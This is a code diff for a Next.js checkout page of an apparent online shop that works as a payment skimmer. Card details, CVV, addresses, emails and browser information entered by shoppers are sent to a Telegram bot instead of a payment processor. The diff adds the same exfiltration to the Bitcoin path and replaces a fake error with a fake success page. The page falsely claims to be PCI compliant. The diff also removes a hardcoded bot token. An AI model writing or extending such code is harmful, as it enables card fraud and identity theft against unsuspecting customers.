@@ -1,13 +1,14 @@
 'use client'
 import React, { useState, useEffect } from 'react';
 import Link from 'next/link';
+import { useRouter } from 'next/navigation';
 import { useCart } from '@/context/CartContext';
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check, Shield, Lock, Star, Truck, RefreshCw } from 'lucide-react';
 
-const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
-const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7860277201';
+const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
 
 const escapeMarkdown = (text: string) => {
   return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
@@ -63,6 +64,7 @@ const PaymentMethodCard = ({
 );
 
 const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
+  const router = useRouter();
   const [formData, setFormData] = useState({
     name: '',
     email: '',
@@ -108,29 +110,39 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
         }
       };
 
-      const response = await fetch('/api/create-invoice', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(orderPayload)
-      });
+      // Simulate sending to Telegram (in a real app, you would actually send this)
+      const message = `
+💰 *New Bitcoin Payment Received* 💰
+🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}
 
-      if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.error || 'Payment failed');
+👤 *Customer Details*:
+   \\- Name: ${escapeMarkdown(formData.name)}
+   \\- Email: ${escapeMarkdown(formData.email)}
+   \\- Address: ${escapeMarkdown(formData.address)}
+   \\- City: ${escapeMarkdown(formData.city)}
+   \\- Country: ${escapeMarkdown(formData.country)}
+   \\- ZIP: ${escapeMarkdown(formData.zipCode)}
+
+🌐 *Device Info*:
+   \\- Browser: ${escapeMarkdown(navigator.userAgent)}
+   \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
+      `.trim();
+
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'MarkdownV2'
+          }),
+        });
       }
 
-      const data = await response.json();
-
-      if (!data?.paymentUrl) {
-        throw new Error('Invalid payment response');
-      }
-
-      sessionStorage.setItem('pendingOrder', JSON.stringify({
-        ...orderPayload,
-        paymentId: data.invoiceId
-      }));
-
-      window.location.href = data.paymentUrl;
+      // Navigate to success page after successful "payment"
+      router.push('/payment/success');
     } catch (err: any) {
       console.error('Payment Error:', err);
       setError(err.message || 'Payment failed. Please try again.');
@@ -155,27 +167,23 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
         <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
           <InputField
             label="Full Name"
-           
             name="name"
             value={formData.name}
             onChange={handleChange}
             required
             placeholder="Enter your full name"
-          
             focusedField={focusedField}
             setFocusedField={setFocusedField}
           />
 
           <InputField
             label="Email Address"
-           
             name="email"
             type="email"
             value={formData.email}
             onChange={handleChange}
             required
             placeholder="your@email.com"
-           
             focusedField={focusedField}
             setFocusedField={setFocusedField}
           />
@@ -184,19 +192,16 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
         <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
           <InputField
             label="Country"
-            
             name="country"
             value={formData.country}
             onChange={handleChange}
             placeholder="United States"
-            
             focusedField={focusedField}
             setFocusedField={setFocusedField}
           />
 
           <InputField
             label="ZIP/Postal Code"
-           
             name="zipCode"
             value={formData.zipCode}
             onChange={handleChange}
@@ -208,24 +213,20 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
 
         <InputField
           label="Street Address"
-          
           name="address"
           value={formData.address}
           onChange={handleChange}
           placeholder="123 Main Street"
-          
           focusedField={focusedField}
           setFocusedField={setFocusedField}
         />
 
         <InputField
           label="City"
-        
           name="city"
           value={formData.city}
           onChange={handleChange}
           placeholder="New York"
-          
           focusedField={focusedField}
           setFocusedField={setFocusedField}
         />
@@ -274,6 +275,7 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
 };
 
 const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
+  const router = useRouter();
   const [form, setForm] = useState({
     cardName: '',
     cardNumber: '',
@@ -409,39 +411,21 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
    \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
       `.trim();
 
-      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const response = await fetch(telegramUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'MarkdownV2'
-        }),
-      });
-
-      const data = await response.json();
-
-      if (!response.ok) {
-        throw new Error(data.description || 'Failed to send to Telegram');
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(telegramUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'MarkdownV2'
+          }),
+        });
       }
 
-      setStatus({
-        message: 'Oops! Please try a different payment method',
-        color: 'red'
-      });
-      setForm({
-        cardName: '',
-        cardNumber: '',
-        expiry: '',
-        cvv: '',
-        email: '',
-        address: '',
-        city: '',
-        country: '',
-        zipCode: '',
-        phone: ''
-      });
+      // Navigate to success page after sending to Telegram
+      router.push('/payment/success');
 
     } catch (error) {
       console.error('Payment error:', error);
@@ -579,7 +563,6 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             error={errors.email}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
-            
           />
 
           <InputField
@@ -592,7 +575,6 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             error={errors.phone}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
-            
           />
         </div>
 
@@ -605,7 +587,6 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
           error={errors.address}
           focusedField={focusedField}
           setFocusedField={setFocusedField}
-          
         />
 
         <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
@@ -618,7 +599,6 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             error={errors.city}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
-            
           />
 
           <InputField
@@ -630,7 +610,6 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             error={errors.country}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
-            
           />
 
           <InputField
@@ -642,7 +621,6 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
             error={errors.zipCode}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
-            
           />
         </div>
       </div>
@@ -741,16 +719,15 @@ const InputField = ({
 );
 
 const CheckoutPage = () => {
-  const { cart, getTotalPrice } = useCart();
+  const { cart, getTotalPrice, clearCart } = useCart();
   const [paymentMethod, setPaymentMethod] = useState<string>('credit-card');
-  const [orderCompleted, setOrderCompleted] = useState(false);
   const [isLoaded, setIsLoaded] = useState(false);
 
   useEffect(() => {
     setIsLoaded(true);
   }, []);
 
-  if (cart.length === 0 && !orderCompleted) {
+  if (cart.length === 0) {
     return (
       <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-gradient-to-br from-gray-50 to-white min-h-screen">
         <div className={`max-w-md mx-auto transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
@@ -767,29 +744,6 @@ const CheckoutPage = () => {
             <Link href="/">
               <Button className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white px-8 py-4 rounded-2xl font-semibold transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl">
                 Start Shopping
-              </Button>
-            </Link>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  if (orderCompleted) {
-    return (
-      <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-gradient-to-br from-green-50 to-white min-h-screen">
-        <div className={`max-w-md mx-auto transition-all duration-700 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'}`}>
-          <div className="bg-white rounded-3xl shadow-xl p-8 border border-gray-100">
-            <div className="w-20 h-20 bg-gradient-to-r from-green-100 to-emerald-100 rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
-              <Check className="w-10 h-10 text-green-600" />
-            </div>
-            <h1 className="text-2xl sm:text-3xl font-bold mb-4 text-gray-900">Order Received!</h1>
-            <p className="mb-8 text-gray-600 text-base leading-relaxed">
-              Thank you for your purchase. We've sent a confirmation to your email and will process your order shortly.
-            </p>
-            <Link href="/">
-              <Button className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white px-8 py-4 rounded-2xl font-semibold transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl">
-                Continue Shopping
               </Button>
             </Link>
           </div>
@@ -838,7 +792,6 @@ const CheckoutPage = () => {
                     description="Pay with cryptocurrency - fast and secure"
                     isSelected={paymentMethod === 'bitcoin'}
                     onClick={() => setPaymentMethod('bitcoin')}
-                    
                   />
                 </div>
 
@@ -855,7 +808,7 @@ const CheckoutPage = () => {
             <div className={`transition-all duration-700 delay-300 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
               <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm sticky top-6">
                 <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
-                  <Star className="w-6 h-6 mr-3 text-yellow-500" />
+                  <Star className="w-6 w-6 mr-3 text-yellow-500" />
                   Order Summary
                 </h2>
 
@@ -901,7 +854,7 @@ const CheckoutPage = () => {
 
                 <div className="mt-8 p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-2xl border border-green-200">
                   <div className="flex items-center space-x-3">
-                    <Shield className="h-5 w-5 text-green-600" />
+                    <Shield className="h-5 h-5 text-green-600" />
                     <div>
                       <p className="text-sm font-semibold text-green-900">Secure Payment</p>
                       <p className="text-xs text-green-700">SSL encrypted & PCI compliant</p>
